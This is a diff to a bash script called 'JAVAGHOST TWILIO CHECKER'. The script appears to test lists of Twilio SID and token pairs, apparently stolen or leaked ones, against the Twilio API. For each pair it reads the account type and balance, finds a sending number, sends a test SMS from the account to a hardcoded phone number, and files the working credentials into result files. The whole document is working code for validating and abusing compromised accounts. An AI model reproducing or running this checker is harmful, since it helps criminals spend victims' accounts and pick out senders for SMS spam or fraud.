@@ -13,6 +13,9 @@ WHITE="\e[1;37m"
 # BASE URL TWILIO API
 BASE_URL="https://api.twilio.com/2010-04-01"
 
+# EDIT NUMBER FOR RECEIVE
+TO_NUMBER="+12546295126"
+
 # BODY MESSAGE ( U CAN CHANGE BY UR FUCKING SELF )
 BODY_MSG="JAVAGHOST TWILIO CHECKER - WORK : $(echo "${TWILIO_AUTH}" | tr "a1i2u3e4o" "*")"
 
@@ -20,7 +23,7 @@ BODY_MSG="JAVAGHOST TWILIO CHECKER - WORK : $(echo "${TWILIO_AUTH}" | tr "a1i2u3
 if [[ ! -d Results ]]; then
 	mkdir Results
 	# CREATE OUTPUT FILES
-	OUTPUT_FILES=("TWILIO_CANT_GET_NUM" "TWILIO_CAN_SEND" "TWILIO_CANT_SEND" "TWILIO_TRIAL" "TWILIO_DEAD_AUTH" "TWILIO_TEST_ACC" "UNKNOWN_ERROR")
+	OUTPUT_FILES=("TWILIO_CANT_GET_NUM" "TWILIO_CAN_SEND" "TWILIO_CANT_SEND" "TWILIO_TRIAL" "TWILIO_DEAD_AUTH" "TWILIO_TEST_ACC" "REGION_NOT_SUPPORT" "UNKNOWN_ERROR")
 	for LST_OUTPUT in ${OUTPUT_FILES[@]}; do
 		touch Results/${LST_OUTPUT}-$(date +"%Y-%m-%d").txt TWILIO_AUTH.tmp
 	done
@@ -85,39 +88,44 @@ function TWILIO_CHECKER(){
 	
 		# GET INFROMATION ABOUT THE SID + TOKEN
 		local GET_TYPE_ACC=$(TWILIO_REQ "Accounts.json" | grep -Po '"type": "\K[^"]+')
-		local GET_FROM_NUM=$(TWILIO_REQ "Accounts/${TWILIO_SID}/IncomingPhoneNumbers.json" | grep -Po '"incoming_phone_numbers": "\K[^"]+')
-		local GET_CREDIT=$(TWILIO_REQ "Accounts/${TWILIO_SID}/Balance.json" | grep -Po '"(currency|balance)": "\K[^"]+' | sed -n '1{h;d};2{p;x;};p' | sed '/./{:a;N;s/\n\(.\)/ \1/;ta}')
+		local GET_FROM_NUM=$(TWILIO_REQ "Accounts/${TWILIO_SID}/IncomingPhoneNumbers.json" | grep -Po '"(incoming_phone_numbers|phone_number)": "\K[^"]+' | head -n1)
+		local GET_BALANCE=$(TWILIO_REQ "Accounts/${TWILIO_SID}/Balance.json" | grep -Po '"(currency|balance)": "\K[^"]+' | sed -n '1{h;d};2{p;x;};p' | sed '/./{:a;N;s/\n\(.\)/ \1/;ta}')
 		local GET_ERROR_MSG=$(echo $CHECK_AUTH | grep -Po '"more_info": "\K[^"]+')
 
-		if [[ $GET_TYPE_ACC == "Full" ]]; then
+		if [[ $GET_TYPE_ACC =~ "Full" ]]; then
 			if [[ -z $GET_FROM_NUM ]]; then
-				echo -e "\n ${WHITE}[ ${GREEN}AUTH ${WHITE}] - ${GREEN}${TWILIO_SID}\n ${WHITE}[ ${GREEN}? ${WHITE}] ACC TYPE : ${GREEN}FULL\n ${WHITE}[ ${GREEN}$ ${WHITE}] CREDIT   : ${GREEN}${GET_CREDIT}\n ${WHITE}[ ${GREEN}* ${WHITE}] FROM NUM : ${RED}FAILED FOR GET FROM NUMBER\n${WHITE} [ ${GREEN}? ${WHITE}] STATUS   : ${RED}SKIPPED FOR CHECK SEND${WHITE}"
-				echo "TWILIO AUTH : ${TWILIO_AUTH}-${GET_FROM_NUM}:${GET_CREDIT}:FAILED GET FROM NUM [ ACC TYPE : FULL ]" >> Results/TWILIO_CANT_GET_NUM-$(date +"%Y-%m-%d").txt
+				TWILIO_REQ "Accounts/${TWILIO_SID}/IncomingPhoneNumbers.json" | jq -r
+				echo -e "\n ${WHITE}[ ${GREEN}AUTH ${WHITE}] - ${GREEN}${TWILIO_SID}\n ${WHITE}[ ${GREEN}? ${WHITE}] ACC TYPE : ${GREEN}FULL\n ${WHITE}[ ${GREEN}$ ${WHITE}] BALANCE  : ${GREEN}${GET_BALANCE}\n ${WHITE}[ ${GREEN}* ${WHITE}] FROM NUM : ${RED}FAILED FOR GET FROM NUMBER\n${WHITE} [ ${GREEN}? ${WHITE}] STATUS   : ${RED}SKIPPED FOR CHECK SEND${WHITE}"
+				echo "TWILIO AUTH : ${TWILIO_AUTH}-${GET_FROM_NUM}:${GET_BALANCE}:FAILED GET FROM NUM [ ACC TYPE : FULL ]" >> Results/TWILIO_CANT_GET_NUM-$(date +"%Y-%m-%d").txt
 			else
 				# SENDING MSG
 				local CHECK_SEND=$(curl -sXPOST "${BASE_URL}/Accounts/${TWILIO_SID}/Messages.json" \
 										--data-urlencode "Body=${BODY_MSG}" --data-urlencode "From=${GET_FROM_NUM}" --data-urlencode "To=${TO_NUMBER}" \
-										-u "${TWILIO_AUTH}" | grep -Po '"status": "\K[^"]+')
+										-u "${TWILIO_AUTH}")
 
 				# CHECKING RESPONSE SENDING MSG
-				if [[ $CHECK_SEND == "sent" || $CHECK_SEND == "queued" || $CHECK_SEND == "delivered" ]]; then
-					echo -e "\n ${WHITE}[ ${GREEN}AUTH ${WHITE}] - ${GREEN}${TWILIO_SID}\n ${WHITE}[ ${GREEN}? ${WHITE}] ACC TYPE : ${GREEN}FULL\n ${WHITE}[ ${GREEN}$ ${WHITE}] CREDIT   : ${GREEN}${GET_CREDIT}\n ${WHITE}[ ${GREEN}* ${WHITE}] FROM NUM : ${GREEN}${GET_FROM_NUM}\n${WHITE}[ ${GREEN}? ${WHITE}] STATUS   : ${GREEN}SUCCESS SEND TO NUM : ${GREEN}${TO_NUMBER}${WHITE}"
-					echo "TWILIO AUTH : ${TWILIO_AUTH}-${GET_FROM_NUM}:${GET_CREDIT}:${GET_FROM_NUM}:WORK SEND TO US NUMBER [ ACC TYPE : FULL ]" >> Results/TWILIO_CAN_SEND-$(date +"%Y-%m-%d").txt
-				elif [[ $CHECK_SEND == "failed" || $CHECK_SEND == "undelivered" ]]; then
-					echo -e "\n ${WHITE}[ ${GREEN}AUTH ${WHITE}] - ${GREEN}${TWILIO_SID}\n ${WHITE}[ ${GREEN}? ${WHITE}] ACC TYPE : ${GREEN}FULL\n ${WHITE}[ ${GREEN}$ ${WHITE}] CREDIT   : ${GREEN}${GET_CREDIT}\n ${WHITE}[ ${GREEN}* ${WHITE}] FROM NUM : ${GREEN}${GET_FROM_NUM}\n${WHITE}[ ${GREEN}? ${WHITE}] STATUS   : ${RED}FAILED SEND TO NUM : ${RED}${TO_NUMBER}${WHITE}"
-					echo "TWILIO AUTH : ${TWILIO_AUTH}-${GET_FROM_NUM}:${GET_CREDIT}:${GET_FROM_NUM}:FAILED SEND TO US NUMBER [ ACC TYPE : FULL ]" >> Results/TWILIO_CANT_SEND-$(date +"%Y-%m-%d").txt
+				if [[ $CHECK_SEND =~ "sent" || $CHECK_SEND =~ "queued" || $CHECK_SEND =~ "delivered" ]]; then
+					echo -e "\n ${WHITE}[ ${GREEN}AUTH ${WHITE}] - ${GREEN}${TWILIO_SID}\n ${WHITE}[ ${GREEN}? ${WHITE}] ACC TYPE : ${GREEN}FULL\n ${WHITE}[ ${GREEN}$ ${WHITE}] BALANCE  : ${GREEN}${GET_BALANCE}\n ${WHITE}[ ${GREEN}* ${WHITE}] FROM NUM : ${GREEN}${GET_FROM_NUM}\n${WHITE} [ ${GREEN}? ${WHITE}] STATUS   : ${GREEN}SUCCESS SEND TO NUM : ${GREEN}${TO_NUMBER}${WHITE}"
+					echo "TWILIO AUTH : ${TWILIO_AUTH}-${GET_FROM_NUM}:${GET_BALANCE}:${GET_FROM_NUM}:WORK SEND TO US NUMBER [ ACC TYPE : FULL ]" >> Results/TWILIO_CAN_SEND-$(date +"%Y-%m-%d").txt
+				elif [[ $CHECK_SEND =~ "failed" || $CHECK_SEND =~ "undelivered" ]]; then
+					echo -e "\n ${WHITE}[ ${GREEN}AUTH ${WHITE}] - ${GREEN}${TWILIO_SID}\n ${WHITE}[ ${GREEN}? ${WHITE}] ACC TYPE : ${GREEN}FULL\n ${WHITE}[ ${GREEN}$ ${WHITE}] BALANCE  : ${GREEN}${GET_BALANCE}\n ${WHITE}[ ${GREEN}* ${WHITE}] FROM NUM : ${GREEN}${GET_FROM_NUM}\n${WHITE} [ ${GREEN}? ${WHITE}] STATUS   : ${RED}FAILED SEND TO NUM : ${RED}${TO_NUMBER}${WHITE}"
+					echo "TWILIO AUTH : ${TWILIO_AUTH}-${GET_FROM_NUM}:${GET_BALANCE}:${GET_FROM_NUM}:FAILED SEND TO US NUMBER [ ACC TYPE : FULL ]" >> Results/TWILIO_CANT_SEND-$(date +"%Y-%m-%d").txt
+				elif [[ $CHECK_SEND =~ "Permission to send an SMS has not been enabled" ]]; then
+					echo -e "\n ${WHITE}[ ${GREEN}AUTH ${WHITE}] - ${GREEN}${TWILIO_SID}\n ${WHITE}[ ${GREEN}? ${WHITE}] ACC TYPE : ${GREEN}FULL\n ${WHITE}[ ${GREEN}$ ${WHITE}] BALANCE  : ${GREEN}${GET_BALANCE}\n ${WHITE}[ ${GREEN}* ${WHITE}] FROM NUM : ${GREEN}${GET_FROM_NUM}\n${WHITE} [ ${GREEN}? ${WHITE}] STATUS   : ${RED}CANT SEND TO REGION WITH CODE ${WHITE}: ${RED}$(echo "${TO_NUMBER}" | head -c2)${WHITE}"
+					echo "TWILIO AUTH : ${TWILIO_AUTH}-${GET_FROM_NUM}:${GET_BALANCE}:${GET_FROM_NUM}:FAILED SEND - REGION NOT SUPPORT [ ACC TYPE : FULL ]" >> Results/REGION_NOT_SUPPORT-$(date +"%Y-%m-%d").txt
 				else
-					echo -e "\n ${WHITE}[ ${GREEN}AUTH ${WHITE}] - ${GREEN}${TWILIO_SID}\n ${WHITE}[ ${GREEN}? ${WHITE}] ACC TYPE : ${GREEN}FULL\n ${WHITE}[ ${GREEN}$ ${WHITE}] CREDIT   : ${GREEN}${GET_CREDIT}\n ${WHITE}[ ${GREEN}* ${WHITE}] FROM NUM : ${GREEN}${GET_FROM_NUM}\n${WHITE}[ ${GREEN}? ${WHITE}] STATUS   : ${RED}CHEK SEND UNKNOWN ERROR${WHITE}"
-					echo "TWILIO AUTH : ${TWILIO_AUTH}-${GET_FROM_NUM}:${GET_CREDIT}:${GET_FROM_NUM}:FAILED SEND - UNKNOWN ERROR TEST SEND [ ACC TYPE : FULL ]" >> Results/UNKNOWN_ERROR-$(date +"%Y-%m-%d").txt
+					echo -e "\n ${WHITE}[ ${GREEN}AUTH ${WHITE}] - ${GREEN}${TWILIO_SID}\n ${WHITE}[ ${GREEN}? ${WHITE}] ACC TYPE : ${GREEN}FULL\n ${WHITE}[ ${GREEN}$ ${WHITE}] BALANCE  : ${GREEN}${GET_BALANCE}\n ${WHITE}[ ${GREEN}* ${WHITE}] FROM NUM : ${GREEN}${GET_FROM_NUM}\n${WHITE} [ ${GREEN}? ${WHITE}] STATUS   : ${RED}CHEK SEND UNKNOWN ERROR${WHITE}"
+					echo "TWILIO AUTH : ${TWILIO_AUTH}-${GET_FROM_NUM}:${GET_BALANCE}:${GET_FROM_NUM}:FAILED SEND - UNKNOWN ERROR TEST SEND [ ACC TYPE : FULL ]" >> Results/UNKNOWN_ERROR-$(date +"%Y-%m-%d").txt
 				fi			
+				# SENDING MSG
 			fi
-		elif [[ $GET_TYPE_ACC == "Trial" ]]; then
+		elif [[ $GET_TYPE_ACC =~ "Trial" ]]; then
 			if [[ -z $GET_FROM_NUM ]]; then
-				echo -e "\n ${WHITE}[ ${GREEN}AUTH ${WHITE}] - ${GREEN}${TWILIO_SID}\n ${WHITE}[ ${GREEN}? ${WHITE}] ACC TYPE : ${GREEN}TRIAL\n ${WHITE}[ ${GREEN}$ ${WHITE}] CREDIT   : ${GREEN}${GET_CREDIT}\n ${WHITE}[ ${GREEN}* ${WHITE}] FROM NUM : ${RED}FAILED GET FROM NUMBER\n${WHITE} [ ${GREEN}? ${WHITE}] STATUS   : ${RED}SKIP FOR CHECK SEND${WHITE}"
-				echo "TWILIO AUTH : ${TWILIO_AUTH}:${GET_CREDIT}:FAILED GET FROM NUM [ ACC TYPE : TRIAL ]" >> Results/TWILIO_TRIAL-$(date +"%Y-%m-%d").txt				
+				echo -e "\n ${WHITE}[ ${GREEN}AUTH ${WHITE}] - ${GREEN}${TWILIO_SID}\n ${WHITE}[ ${GREEN}? ${WHITE}] ACC TYPE : ${GREEN}TRIAL\n ${WHITE}[ ${GREEN}$ ${WHITE}] BALANCE  : ${GREEN}${GET_BALANCE}\n ${WHITE}[ ${GREEN}* ${WHITE}] FROM NUM : ${RED}FAILED GET FROM NUMBER\n${WHITE}  [ ${GREEN}? ${WHITE}] STATUS   : ${RED}SKIP FOR CHECK SEND${WHITE}"
+				echo "TWILIO AUTH : ${TWILIO_AUTH}:${GET_BALANCE}:FAILED GET FROM NUM [ ACC TYPE : TRIAL ]" >> Results/TWILIO_TRIAL-$(date +"%Y-%m-%d").txt				
 			else
-				echo -e "\n ${WHITE}[ ${GREEN}AUTH ${WHITE}] - ${GREEN}${TWILIO_SID}\n ${WHITE}[ ${GREEN}? ${WHITE}] ACC TYPE : ${GREEN}TRIAL\n ${WHITE}[ ${GREEN}$ ${WHITE}] CREDIT   : ${GREEN}${GET_CREDIT}\n ${WHITE}[ ${GREEN}* ${WHITE}] FROM NUM : ${GREEN}${GET_FROM_NUM}\n${WHITE} [ ${GREEN}? ${WHITE}] STATUS   : ${RED}SKIP FOR CHECK SEND${WHITE}"
-				echo "TWILIO AUTH : ${TWILIO_AUTH}:${GET_CREDIT}:${GET_FROM_NUM} [ ACC TYPE : TRIAL ]" >> Results/TWILIO_TRIAL-$(date +"%Y-%m-%d").txt
+				echo -e "\n ${WHITE}[ ${GREEN}AUTH ${WHITE}] - ${GREEN}${TWILIO_SID}\n ${WHITE}[ ${GREEN}? ${WHITE}] ACC TYPE : ${GREEN}TRIAL\n ${WHITE}[ ${GREEN}$ ${WHITE}] BALANCE  : ${GREEN}${GET_BALANCE}\n ${WHITE}[ ${GREEN}* ${WHITE}] FROM NUM : ${GREEN}${GET_FROM_NUM}\n${WHITE}  [ ${GREEN}? ${WHITE}] STATUS   : ${RED}SKIP FOR CHECK SEND${WHITE}"
+				echo "TWILIO AUTH : ${TWILIO_AUTH}:${GET_BALANCE}:${GET_FROM_NUM} [ ACC TYPE : TRIAL ]" >> Results/TWILIO_TRIAL-$(date +"%Y-%m-%d").txt
 			fi
 		else
 			echo -e "\n ${WHITE}[ ${RED}AUTH ${WHITE}] - ${GREEN}${TWILIO_SID} : ${RED}UNKNOWN ERROR${WHITE}"
